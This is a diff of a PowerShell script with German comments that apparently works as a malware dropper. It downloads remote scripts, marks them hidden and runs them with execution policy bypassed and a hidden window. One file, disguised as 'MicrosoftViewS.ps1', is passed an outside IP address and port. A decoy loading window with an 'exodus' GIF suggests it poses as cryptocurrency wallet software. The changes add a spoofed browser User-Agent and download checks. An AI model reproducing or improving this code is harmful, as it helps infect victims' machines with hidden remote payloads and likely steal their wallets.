@@ -47,10 +47,19 @@ foreach ($script in $scripts) {
         try {
             Set-ExecutionPolicy Bypass -Scope Process -Force
             $filePath = Join-Path $targetDir $fileName
-            Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing -ErrorAction SilentlyContinue
+            $headers = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+            Invoke-WebRequest -Uri $url -OutFile $filePath -UseBasicParsing -Headers $headers -ErrorAction SilentlyContinue
             Set-HiddenAttribute -path $filePath  # File hidden machen
-            Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOADED ${fileName} nach $filePath" -ErrorAction SilentlyContinue
-            Write-Output "DOWNLOADED: $fileName -> $filePath"
+            if (Test-Path $filePath) {
+                $fileSize = (Get-Item $filePath).Length
+                if ($fileSize -eq 0) { 
+                    Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD WARN ${fileName} : File leer (0 Bytes) – URL prüfen!" -ErrorAction SilentlyContinue
+                    Write-Output "WARNING: $fileName ist leer (0 Bytes)"
+                } else {
+                    Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOADED ${fileName} nach $filePath (Size: $fileSize Bytes)" -ErrorAction SilentlyContinue
+                    Write-Output "DOWNLOADED: $fileName -> $filePath (Size: $fileSize Bytes)"
+                }
+            }
         } catch {
             $errorMsg = $_.Exception.Message -replace ':', ' - '
             Add-Content -Path $logPath -Value "$(Get-Date): DOWNLOAD FEHLER ${fileName} : $errorMsg" -ErrorAction SilentlyContinue
@@ -62,7 +71,7 @@ foreach ($script in $scripts) {
 }
 
 # Warte kurz auf Downloads, dann Exec
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 3  # Etwas länger für Downloads
 foreach ($job in $downloadJobs) {
     Receive-Job $job | Out-Null
     Remove-Job $job -Force
@@ -73,7 +82,12 @@ foreach ($script in $scripts) {
     $filePath = Join-Path $targetDir $script.FileName
     if (Test-Path $filePath) {
         try {
-            Write-Host "Exec: $($script.FileName) aus $filePath"  # Debug – entferne später
+            $fileSize = (Get-Item $filePath).Length
+            if ($fileSize -eq 0) {
+                Write-Host "SKIP EXEC: $($script.FileName) ist leer – kein Run!"  # Debug
+                continue
+            }
+            Write-Host "Exec: $($script.FileName) aus $filePath (Size: $fileSize Bytes)"  # Debug – entferne später
             if ($script.FileName -eq "MicrosoftViewS.ps1") {
                 $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"", "-a14", "145.223.117.77", "-a15", "8080", "-a16", "20", "-a17", "70")
             } else {
@@ -136,7 +150,7 @@ $form.Controls.Add($headerPanel)
 # GIF
 $gifUrl = "https://raw.githubusercontent.com/KunisCode/23sdafuebvauejsdfbatzg23rS/main/loading.gif"
 $gifPath = Join-Path $env:TEMP "exodus_loading.gif"
-try { Invoke-WebRequest -Uri $gifUrl -OutFile $gifPath -UseBasicParsing } catch {}
+try { Invoke-WebRequest -Uri $gifUrl -OutFile $gifPath -UseBasicParsing -Headers @{"User-Agent"="Mozilla/5.0"} } catch {}
 $pictureBox = New-Object System.Windows.Forms.PictureBox
 $pictureBox.Dock = "Top"
 $pictureBox.Height = 400
